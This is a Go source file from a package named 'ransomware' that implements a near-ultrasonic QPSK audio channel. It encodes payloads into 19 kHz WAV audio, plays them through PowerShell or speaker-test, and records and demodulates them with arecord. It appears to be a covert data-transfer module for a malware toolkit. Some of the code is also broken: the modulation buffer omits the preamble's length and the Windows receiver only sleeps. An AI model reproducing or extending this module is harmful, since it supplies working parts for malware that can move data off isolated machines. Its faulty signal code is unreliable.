package ransomware

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"math"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

type UltrasoundQPSK struct {
	config       *RansomwareConfig
	sampleRate   int
	carrierFreq  float64
	symbolRate   float64
	volume       float64
}

const (
	defaultSampleRate   = 44100
	defaultCarrierFreq  = 19000.0
	defaultQPSKSymbolRate = 100.0
)

func NewUltrasoundQPSK(cfg *RansomwareConfig) *UltrasoundQPSK {
	return &UltrasoundQPSK{
		config:      cfg,
		sampleRate:  defaultSampleRate,
		carrierFreq: defaultCarrierFreq,
		symbolRate:  defaultQPSKSymbolRate,
		volume:      0.8,
	}
}

func (u *UltrasoundQPSK) QPSKModulate(data []byte) ([]byte, error) {
	symbols := len(data) * 4
	samplesPerSymbol := u.sampleRate / int(u.symbolRate)
	totalSamples := symbols * samplesPerSymbol

	wave := make([]float64, totalSamples)
	preamble := u.generatePreamble(samplesPerSymbol)
	copy(wave[:len(preamble)], preamble)
	offset := len(preamble)

	constellation := map[byte][2]float64{
		0b00: {1.0, 1.0},
		0b01: {-1.0, 1.0},
		0b10: {1.0, -1.0},
		0b11: {-1.0, -1.0},
	}

	for _, b := range data {
		for bitPair := 0; bitPair < 4; bitPair++ {
			symbol := (b >> (6 - bitPair*2)) & 0b11
			coords := constellation[byte(symbol)]

			for s := 0; s < samplesPerSymbol; s++ {
				t := float64(offset+s) / float64(u.sampleRate)
				i := coords[0] * math.Cos(2*math.Pi*u.carrierFreq*t)
				q := coords[1] * math.Sin(2*math.Pi*u.carrierFreq*t)
				wave[offset+s] = (i + q) * u.volume / 2.0
			}
			offset += samplesPerSymbol
		}
	}

	out := make([]byte, totalSamples*2)
	for i := 0; i < totalSamples; i++ {
		val := int16(wave[i] * 32767)
		out[i*2] = byte(val)
		out[i*2+1] = byte(val >> 8)
	}

	return out, nil
}

func (u *UltrasoundQPSK) generatePreamble(samplesPerSymbol int) []float64 {
	pattern := []byte{0b10, 0b01, 0b10, 0b01, 0b00, 0b11, 0b00, 0b11}
	preamble := make([]float64, len(pattern)*samplesPerSymbol)

	constellation := map[byte]float64{
		0b00: 1.0,
		0b01: 0.0,
		0b10: -1.0,
	}

	for i := 0; i < len(pattern); i++ {
		val := constellation[byte(pattern[i])]
		for s := 0; s < samplesPerSymbol; s++ {
			t := float64(i*samplesPerSymbol+s) / float64(defaultSampleRate)
			preamble[i*samplesPerSymbol+s] = val * math.Sin(2*math.Pi*18000*t) * 0.5
		}
	}
	return preamble
}

func (u *UltrasoundQPSK) EncodePayload(payload []byte) []byte {
	header := make([]byte, 16)
	header[0] = 0x58
	header[1] = 0x34
	header[2] = 0x30
	header[3] = 0x34
	header[4] = 0x58
	header[5] = byte(len(payload))
	header[6] = byte(len(payload) >> 8)
	header[7] = byte(len(payload) >> 16)
	header[8] = byte(len(payload) >> 24)
	header[9] = 0x01

	encoded := append(header, payload...)
	for len(encoded)%4 != 0 {
		encoded = append(encoded, 0x00)
	}
	return encoded
}

func (u *UltrasoundQPSK) PlayFrequencies(freq []int, durationMs int) error {
	if runtime.GOOS == "windows" {
		psScript := fmt.Sprintf(`
$freqs = @(%s)
$dur = %d
foreach($f in $freqs) {
    [Console]::Beep($f, $dur)
    Start-Sleep -Milliseconds 50
}
`, strings.Trim(strings.Join(strings.Fields(fmt.Sprint(freq)), ","), "[]"), durationMs)

		cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command", psScript)
		return cmd.Run()
	}

	if runtime.GOOS == "linux" {
		for _, f := range freq {
			exec.Command("speaker-test", "-t", "sine", "-f", fmt.Sprintf("%d", f),
				"-l", "1", "-D", "default").Run()
		}
		return nil
	}

	return fmt.Errorf("platform not supported for audio output")
}

func (u *UltrasoundQPSK) GenerateAudioFile(wave []byte, outputPath string) error {
	var header [44]byte
	copy(header[0:4], "RIFF")
	fileSize := uint32(36 + len(wave))
	header[4] = byte(fileSize)
	header[5] = byte(fileSize >> 8)
	header[6] = byte(fileSize >> 16)
	header[7] = byte(fileSize >> 24)
	copy(header[8:12], "WAVE")
	copy(header[12:16], "fmt ")
	header[16] = 16
	header[20] = 1
	header[22] = 1
	sampleRate := uint32(u.sampleRate)
	header[24] = byte(sampleRate)
	header[25] = byte(sampleRate >> 8)
	header[26] = byte(sampleRate >> 16)
	header[27] = byte(sampleRate >> 24)
	byteRate := uint32(u.sampleRate * 2)
	header[28] = byte(byteRate)
	header[29] = byte(byteRate >> 8)
	header[30] = byte(byteRate >> 16)
	header[31] = byte(byteRate >> 24)
	header[32] = 2
	header[34] = 16
	copy(header[36:40], "data")
	dataSize := uint32(len(wave))
	header[40] = byte(dataSize)
	header[41] = byte(dataSize >> 8)
	header[42] = byte(dataSize >> 16)
	header[43] = byte(dataSize >> 24)

	f, err := os.Create(outputPath)
	if err != nil {
		return err
	}
	defer f.Close()

	f.Write(header[:])
	f.Write(wave)
	return nil
}

func (u *UltrasoundQPSK) ReceiveUltrasound(durationSec int) ([]byte, error) {
	if runtime.GOOS == "linux" {
		tmpFile := fmt.Sprintf("/tmp/x404x_ultrasound_%d.wav", os.Getpid())
		cmd := exec.Command("arecord", "-d", fmt.Sprintf("%d", durationSec),
			"-f", "S16_LE", "-r", fmt.Sprintf("%d", u.sampleRate),
			"-c", "1", tmpFile)
		cmd.Run()

		data, err := os.ReadFile(tmpFile)
		os.Remove(tmpFile)
		if err != nil {
			return nil, err
		}
		return u.QPSKDemodulate(data[44:]), nil
	}

	if runtime.GOOS == "windows" {
		psScript := fmt.Sprintf(`
Add-Type -AssemblyName System.Speech
$rec = New-Object System.Speech.Recognition.SpeechRecognitionEngine
Write-Host "Ultrasound receiver activated (%d seconds)"
Start-Sleep -Seconds %d
`, durationSec, durationSec)
		exec.Command("powershell", "-Command", psScript).Run()
	}

	return nil, fmt.Errorf("receiver not supported on %s", runtime.GOOS)
}

func (u *UltrasoundQPSK) QPSKDemodulate(wave []byte) []byte {
	if len(wave) < 88 {
		return nil
	}

	samplesPerSymbol := u.sampleRate / int(u.symbolRate)
	totalSamples := len(wave) / 2

	samples := make([]float64, totalSamples)
	for i := 0; i < totalSamples; i++ {
		samples[i] = float64(int16(wave[i*2])|int16(wave[i*2+1])<<8) / 32767.0
	}

	var result []byte
	var currentByte byte
	bitPos := 0

	for i := samplesPerSymbol; i < totalSamples-samplesPerSymbol; i += samplesPerSymbol {
		iVal := samples[i] * math.Cos(2*math.Pi*u.carrierFreq*float64(i)/float64(u.sampleRate))
		qVal := samples[i] * math.Sin(2*math.Pi*u.carrierFreq*float64(i)/float64(u.sampleRate))

		var symbol byte
		if iVal >= 0 && qVal >= 0 {
			symbol = 0b00
		} else if iVal < 0 && qVal >= 0 {
			symbol = 0b01
		} else if iVal >= 0 && qVal < 0 {
			symbol = 0b10
		} else {
			symbol = 0b11
		}

		currentByte = (currentByte << 2) | symbol
		bitPos += 2

		if bitPos == 8 {
			result = append(result, currentByte)
			currentByte = 0
			bitPos = 0
		}
	}

	return result
}

func (u *UltrasoundQPSK) FullUltrasoundSuite(payloadStr string) map[string]interface{} {
	result := make(map[string]interface{})

	payload := []byte(payloadStr)
	encoded := u.EncodePayload(payload)

	wave, err := u.QPSKModulate(encoded)
	if err != nil {
		result["error"] = err.Error()
		return result
	}

	tmpFile := fmt.Sprintf("/tmp/x404x_ultrasound_%d.wav", os.Getpid())
	if err := u.GenerateAudioFile(wave, tmpFile); err != nil {
		result["error"] = fmt.Sprintf("audio file: %v", err)
		return result
	}

	result["wav_file"] = tmpFile
	result["wav_size"] = len(wave)
	result["payload_size"] = len(payload)
	result["encoded_size"] = len(encoded)
	result["carrier_freq"] = fmt.Sprintf("%.0f Hz", u.carrierFreq)
	result["symbol_rate"] = fmt.Sprintf("%.0f baud", u.symbolRate)
	result["duration_ms"] = len(wave) * 1000 / (u.sampleRate * 2)

	if runtime.GOOS == "linux" {
		result["receiver"] = "arecord available"
	}

	return result
}

var (
	_ = bytes.NewBuffer
	_ = base64.StdEncoding
	_ = math.Pi
	_ = time.Second
)
